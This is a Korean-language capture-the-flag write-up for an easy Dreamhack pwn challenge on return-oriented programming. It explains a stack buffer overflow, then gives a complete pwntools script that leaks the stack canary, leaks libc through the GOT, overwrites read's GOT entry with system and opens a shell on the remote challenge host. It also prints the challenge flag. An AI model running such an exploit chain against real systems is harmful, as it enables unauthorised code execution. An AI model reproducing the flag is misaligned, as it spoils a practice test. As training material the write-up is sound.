---
ctf_name: "wargame"
challenge_name: "rop"
category: "pwn"           # web / pwn / rev / crypto / misc
difficulty: "easy"      # easy / medium / hard / insane
author: "aswe0810m"
date: "2026-05-12"
points: 500
tags: [ROP, SBOF]
---

# 문제명

## 문제 설명

> Exploit Tech: Return Oriented Programming에서 실습하는 문제입니다.

- 문제 URL / 파일 등 접속 정보

## 풀이

### 분석

먼저 checksec 명령으로 파일에 설정된 보호 기법들을 살펴보면 카나리와 NX가 적용되어 있고, ASLR도 리눅스에서서 기본적으로 적용되어 있으며, PIE는 적용되지 않았다.

### 취약점

buf의 크기는 0x30이지만, read시 0x100을 읽으므로 스택 버퍼 오버플로우 취약점이 있다. 이때 프로그램에서 두번 입력을 받으므로 처음 입력에서 카나리를 leak하고 이를 바탕으로 카나리를 우회해서 system 함수의 주소를 계산하고, "/bin/sh" 문자열을 임의로 주입하여 이들을 이용하여 GOT Overwrite을 하여 ROP 체인을 구성하면 익스플로잇 할 수 있다.

### 익스플로잇

1. 카나리 우회
gdb를 통해서 버퍼와 함수 카나리 사이의 크기를 구하면 0x38만큼의 차이가 있다는 것을 알 수 있다. 따라서 입력버퍼에 b'A'*(0x38+1) 만큼 입력한다면 카나리를 leak할 수 있다(1바이트는 카나리의 \x00에 해당하는 바이트).

2. system 함수의 주소 계산
read 함수의 got를 읽고, read 함수와 system 함수의 오프셋을 이용하여 system 함수를 계산한다. pwntools에는 ELF.symbols 이라는 메소드가 정의되어 있는데, 특정 ELF 심볼 사이의 오프셋을 계산할 때 유용하게 사용할 수 있다.

3. GOT Overwrite 및 "/bin/sh"
"/bin/sh"의 주소를 알아야 하므로 GOT 엔트리 뒤에 덮어 쓰고 GOT 엔트리의 주소에 + 0x8로 접근하면 된다.

```python
from pwn import *

def slog(n, m): return success(": ".join([n, hex(m)]))

p = remote("host8.dreamhack.games", 23206)
e = ELF("./rop")
libc = ELF("./libc.so.6")

context.arch = "amd64"

buf = b'A'*0x39
p.sendafter(b"Buf: ", buf)
p.recvuntil(buf)

cnry = u64(b'\x00' + p.recvn(7))
slog("Canary", cnry)

read_plt = e.plt["read"]
read_got = e.got["read"]
write_plt = e.plt["write"]
pop_rdi = 0x400853
pop_rsi_r15 = 0x400851
ret = 0x400596

payload = b'A'*0x38 + p64(cnry) + b'B'*0x8

# write(1, read_got, ...)
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(write_plt)

# read(0, read_got, ...)
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(read_plt)

# read("/bin/sh") == system("/bin/sh")
payload += p64(pop_rdi)
payload += p64(read_got + 0x8)
payload += p64(ret)
payload += p64(read_plt)

p.sendafter(b"Buf: ", payload)
read = u64(p.recvn(6) + b'\x00'*2)
lb = read - libc.symbols["read"]
system = lb + libc.symbols["system"]
slog("read", read)
slog("libc_base", lb)
slog("system", system)

p.send(p64((system)) + b'/bin/sh\x00')
p.interactive()
```

## 플래그

```
DH{8056b333681caa09d67d1d7aa48a3586ef867de0ac3b778c9839d449d4fcb0cf}
```

## 배운 점

Return Oriented Programming이 무엇인지 어떻게 활용할 수 있는지를 알게되었다. ASLR로 라이브러리와 스택, 힙 등의 주소를 랜덤화하여도 라이브러리 사이의 오프셋을 이용하여 base 주소를 알아내서 특정 라이브러리를 실행하여 익스플로잇 할 수 있다는 것을 알게되었다. 사실상 스택 버퍼 오버플로우 문제가 발생하면 많은 문제가 발생한다는 것을 느꼈다. 또한 GOT와 PLT가 무엇인지 알게되었다.
